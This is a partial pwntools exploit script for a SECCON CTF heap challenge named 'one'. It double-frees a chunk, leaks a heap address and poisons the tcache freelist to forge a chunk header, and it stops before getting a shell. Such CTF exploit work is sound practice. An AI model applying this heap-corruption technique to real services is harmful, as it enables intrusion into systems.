#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./one"

rhp1 = {"host":"one.chal.seccon.jp","port":18357}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def add(conn,content):
  if(len(content)>=0x40):
    print("[!]too large content")
    return
  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil("> ")
  conn.sendline(content)

def delete(conn):
  conn.recvuntil("> ")
  conn.sendline("3")

def show(conn):
  conn.recvuntil("> ")
  conn.sendline("2")

def exploit(conn):
  add(conn,"A"*0x10)
  for i in range(3):
    delete(conn)
  
  #leak heap addr
  show(conn)
  heap_usr = unpack(conn.recvline()[:-1].ljust(8,"\x00")[0:8])
  print("[+]heap_usr: "+hex(heap_usr))

  #
  add(conn,p64(heap_usr+0x40))
  add(conn,p64(heap_usr+0x40))
  raw_input()
  add(conn,p64(0)+p64(0x201)) #top

  #
  for i in range(8):
    add(conn,"E"*8)


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

